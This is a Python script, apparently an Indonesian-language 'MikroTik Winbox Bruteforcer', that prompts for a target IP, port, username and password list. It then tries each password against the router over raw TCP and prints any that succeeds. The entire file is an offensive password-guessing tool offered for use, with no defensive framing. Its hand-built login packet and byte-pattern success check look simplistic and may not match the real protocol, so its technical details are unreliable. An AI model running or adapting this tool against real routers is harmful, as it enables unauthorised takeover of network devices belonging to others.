import sys
import time
import os
import socket
from tqdm import tqdm

def banner():
    print('=================================================')
    print('             MikroTik Winbox Bruteforcer          ')
    print('=================================================')
    print('                by GwEx Net               ')
    print('=================================================')

def main():
    target = input('Masukkan alamat IP target: ')
    port = int(input('Masukkan port: '))
    username = input('Masukkan username: ')
    passlist_path = input('Masukkan path file password list: ')

    if not os.path.isfile(passlist_path):
        print(f"File '{passlist_path}' tidak ditemukan.")
        sys.exit()

    with open(passlist_path, 'r') as f:
        passwords = f.read().splitlines()

    banner()
    print(f'[+] Target: {target}')
    print(f'[+] Port: {port}')
    print(f'[+] Username: {username}')
    print(f'[+] Jumlah password: {len(passwords)}')
    print('=================================================')

    for password in tqdm(passwords, desc="Mencoba password"):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        try:
            sock.connect((target, port))
            data = sock.recv(1024)
            login_packet = b'\x01\x00\x00\x2b\x00\x06\x00\x00\x00\x00\x00\x00\x00\x00' \
                + bytes([len(username)]) + username.encode() \
                + bytes([len(password)]) + password.encode()
            sock.send(login_packet)
            data = sock.recv(1024)
            if b'\x05\x00' in data:
                print(f"[+] Password ditemukan: {password}")
                sys.exit()
        except socket.timeout:
            continue
        finally:
            sock.close()

    print("[-] Password tidak ditemukan di list yang diberikan.")

if __name__ == '__main__':
    main()
